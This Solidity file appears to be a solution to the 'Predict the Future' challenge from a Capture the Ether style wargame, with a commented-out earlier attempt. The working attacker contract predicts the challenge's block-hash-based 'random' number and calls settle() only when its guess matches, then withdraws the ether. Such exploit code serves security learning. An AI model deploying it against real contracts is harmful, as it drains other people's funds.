// pragma solidity ^0.4.21;

// interface IPredictTheFutureChallenge{
//     function lockInGuess(uint8 n) external payable;
//     function settle() external;
//     function isComplete() external view returns (bool);
// }
// contract PredictTheFutureAnswer {
//     uint8 guess = 0;
//     address owner;
//     uint256 settlementBlockNumber;
//     IPredictTheFutureChallenge game;
//     function PredictTheFutureAnswer(address adr) public payable {
//         owner = msg.sender;
//         game = IPredictTheFutureChallenge(adr);
//     }

 
//     function lock() public payable {
//         game.lockInGuess.value(1 ether)(guess);
//     }

//     function pwn() public payable{
//         // uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
//         // require(answer == guess);
//         while(!game.isComplete()){
//             // uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
//             // require(answer == guess);
//             game.settle();
//         }
        
//         // require(game.isComplete());
//     }

//     function nextBlock() public payable{
//         require(msg.sender == owner);
//         msg.sender.transfer(address(this).balance);
//     }

// }

pragma solidity ^0.4.21;

import "./PredictTheFuture.sol";

contract PredictTheFutureAnswer {
    address owner;

    function PredictTheFutureAnswer() public {
        owner = msg.sender;
    }

    function lockInGuess(address _challenge, uint8 n)
    public
    payable {
        require(msg.value == 1 ether);

        PredictTheFutureChallenge challenge = PredictTheFutureChallenge(_challenge);
        challenge.lockInGuess.value(msg.value)(n);
    }

    function guess(address _challenge, uint8 n)
    public
    payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        if (answer == n) {
            PredictTheFutureChallenge challenge = PredictTheFutureChallenge(_challenge);
            challenge.settle();
        }
    }

    function ()
    public
    payable {
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}